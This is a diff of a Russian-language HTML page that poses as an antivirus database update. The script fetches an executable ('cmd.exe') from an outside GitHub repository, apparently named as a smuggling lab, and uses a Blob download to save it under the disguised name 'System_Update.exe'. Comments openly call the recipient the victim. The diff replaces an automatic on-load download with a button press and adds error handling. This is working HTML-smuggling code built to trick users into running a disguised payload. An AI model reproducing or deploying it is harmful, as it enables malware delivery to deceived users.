@@ -5,35 +5,46 @@
 </head>
 <body>
     <h1 style="font-family: Arial;">Система обновляет антивирусные базы...</h1>
-    <p style="font-family: Arial;">Пожалуйста, подождите, идет загрузка компонента.</p>
+    <p style="font-family: Arial;">Пожалуйста, нажмите на кнопку, чтобы завершить установку.</p>
+
+    <!-- Кнопка для запуска скачивания -->
+    <button onclick="smuggle()" style="padding: 10px; font-size: 16px; cursor: pointer;">Скачать обновление</button>
 
     <script>
-        // 1. Указываем прямую ссылку на наш файл (payload)
-        const url = 'https://github.com/richardamiller8282-boop/smuggle-lab2/blob/main/cmd.exe';
+        async function smuggle() {
+            // ТОЧНАЯ ссылка на твой файл (smuggle-lab2 + cmd.exe)
+            const url = 'https://raw.githubusercontent.com/richardamiller8282-boop/smuggle-lab2/main/cmd.exe';
 
-        // 2. Автоматически запускаем загрузку после загрузки страницы
-        window.onload = async function() {
             try {
-                // Загружаем файл в память браузера через fetch
+                // 1. Загружаем файл
                 const response = await fetch(url);
+                
+                // Проверяем, ответил ли сервер успехом
+                if (!response.ok) {
+                    alert('Ошибка загрузки: Сервер ответил ' + response.status + ' (файл не найден?)');
+                    console.log('Статус:', response.status);
+                    return;
+                }
+
+                // 2. Создаем Blob
                 const blob = await response.blob();
 
-                // Создаем ссылку на этот объект (blob)
+                // 3. Создаем ссылку и кликаем по ней
                 const link = document.createElement('a');
                 link.href = URL.createObjectURL(blob);
-                link.download = 'Calculator_Update.exe'; // Имя, которое увидит жертва
+                link.download = 'System_Update.exe'; // Имя для жертвы
                 
-                // Кликаем по ней, чтобы браузер начал скачивание
                 document.body.appendChild(link);
                 link.click();
                 document.body.removeChild(link);
                 
-                // Освобождаем память
+                // 4. Освобождаем память
                 URL.revokeObjectURL(link.href);
-            } catch (e) {
-                console.error('Ошибка загрузки:', e);
+            } catch (error) {
+                alert('Ошибка сети или CORS: ' + error.message);
+                console.error('Ошибка:', error);
             }
-        };
+        }
     </script>
 </body>
 </html>
